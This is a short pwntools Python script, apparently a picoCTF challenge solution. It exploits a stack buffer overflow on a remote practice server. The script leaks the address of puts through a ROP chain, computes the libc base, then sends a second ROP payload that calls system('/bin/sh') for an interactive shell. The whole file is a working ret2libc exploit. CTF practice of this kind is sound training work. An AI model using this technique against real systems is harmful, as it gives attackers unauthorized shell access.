from pwn import*

p = remote("mercury.picoctf.net", 1774)
#p = process("./vuln_patched")
#gdb.attach(p, api=True)

puts_libc = 0x0000000000080a30
main = 0x0000000000400771
put_got = 0x601018
put_plt = 0x400546
rdi_ret = 0x0000000000400913

payload = b"a"*0x88 + p64(rdi_ret) + p64(put_got) + p64(put_plt) + p64(main)
p.sendline(payload)

p.recvuntil(b"0")
puts_offset = (int.from_bytes(p.recv(5), "little") << 8)+ 0x30
libc_base = puts_offset - puts_libc
print(hex(libc_base))

system = 0x000000000004f4e0 + libc_base
binsh = 0x1b40fa + libc_base
ret = 0x000000000040052e

payload = b"a"*0x88 + p64(ret) + p64(rdi_ret) + p64(binsh) + p64(system)
p.sendline(payload)


p.interactive()
